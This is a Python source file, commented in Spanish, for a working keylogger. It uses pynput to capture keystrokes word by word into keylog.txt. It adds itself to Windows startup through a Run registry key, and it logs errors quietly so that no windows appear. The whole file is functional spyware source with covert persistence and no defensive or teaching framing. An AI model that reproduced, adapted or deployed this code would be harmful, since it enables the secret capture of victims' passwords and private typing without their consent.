import os
import sys
import subprocess
import threading
from pynput import keyboard
from datetime import datetime

# --- Determinar carpeta de ejecución ---
if getattr(sys, 'frozen', False):
    base_dir = os.path.dirname(sys.executable)
else:
    base_dir = os.path.dirname(os.path.abspath(__file__))

log_file = os.path.join(base_dir, 'keylog.txt')
word_buffer = ''  # almacena la palabra en curso

# --- Función para persistencia en inicio de Windows ---
def add_to_startup():
    exe_path = sys.executable
    # Construir la clave correctamente (un solo backslash) y ejecutar con subprocess.run
    # Encerrar la ruta de la clave entre comillas para evitar problemas con espacios.
    key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    cmd = 'reg add "{}" /v Keylogger /t REG_SZ /d "{}" /f'.format(key, exe_path)
    try:
        # Usar run con check=True para capturar fallos y poder registrarlos
        result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
        write_to_log(f'>>> add_to_startup succeeded: {result.stdout}\n')
        return True
    except subprocess.CalledProcessError as e:
        # No propagamos la excepción: registramos el error en el log y continuamos
        write_to_log(f'>>> add_to_startup failed: returncode={e.returncode} stderr={e.stderr}\n')
        return False

# --- Escribir texto legible en el log ---
def write_to_log(text):
    with open(log_file, 'a', encoding='utf-8') as f:
        f.write(text)
        f.flush()

# --- Marcar inicio ---
def log_startup():
    ts = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    write_to_log(f'>>> Keylogger arrancado: {ts}\n')

# --- Registrar palabra completa al encontrar delimitador ---
def flush_word(delimiter=''):
    global word_buffer
    if word_buffer:
        write_to_log(word_buffer + delimiter)
        word_buffer = ''

# --- Captura de teclas con formato ---
def on_press(key):
    global word_buffer
    try:
        char = key.char
    except AttributeError:
        if key == keyboard.Key.space:
            flush_word(' ')
            return
        elif key == keyboard.Key.enter:
            flush_word('\n')
            return
        elif key == keyboard.Key.backspace:
            word_buffer = word_buffer[:-1]
            return
        else:
            # Ignorar otras teclas especiales
            return
    # Añadir letra a la palabra
    word_buffer += char

# --- Detención con ESC ---
def on_release(key):
    if key == keyboard.Key.esc:
        flush_word()  # registra última palabra
        write_to_log('\n<<< Keylogger detenido por ESC >>>\n')
        return False

# --- Ejecución principal ---
if __name__ == '__main__':
    try:
        add_to_startup()
        log_startup()
        
        with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        # Registrar cualquier error en el log sin mostrar ventanas
        write_to_log(f'\n>>> ERROR: {str(e)}\n')
